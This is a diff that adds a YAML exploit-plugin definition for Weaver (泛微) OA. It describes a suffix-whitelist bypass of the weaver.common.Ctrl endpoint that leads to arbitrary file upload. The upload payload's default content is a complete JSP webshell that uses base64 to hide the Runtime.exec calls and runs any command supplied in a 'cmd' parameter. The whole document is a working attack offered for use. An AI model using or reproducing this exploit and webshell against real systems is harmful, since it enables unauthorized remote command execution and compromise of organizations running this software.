@@ -1,0 +1,46 @@
+info:
+    app: 泛微OA
+    name: common_Ctrl
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-04-17"
+    create_date: "2024-10-06 09:27:44"
+    update_date: "2024-10-06 09:27:44"
+    description: 通过构造白名单后缀可绕过接口的访问限制，并调佣任意类实现文件上传
+    detail: |-
+        漏洞URI: /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
+        后缀除了css还可以是.cur、.ico、.css、.htm、.html、.png、.jpg、.gif
+        填写文件名和文件内容上传即可，上传成功会返回webshell路径
+payloads:
+    - name: upload1
+      alias: 文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: test.jsp
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: |-
+                <%@ page contentType="text/html;charset=UTF-8" language="java" %>
+                <%@ page import="sun.misc.BASE64Decoder" %>
+                <%
+                    if(request.getParameter("cmd")!=null){
+                        BASE64Decoder decoder = new BASE64Decoder();
+                        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
+                        Process e = (Process)
+                                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
+                                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
+                                        Object[]{}), request.getParameter("cmd") );
+                        java.io.InputStream in = e.getInputStream();
+                        int a = -1;
+                        byte[] b = new byte[2048];
+                        out.print("<pre>");
+                        while((a=in.read(b))!=-1){
+                            out.println(new String(b));
+                        }
+                        out.print("</pre>");
+                    }
+                %>
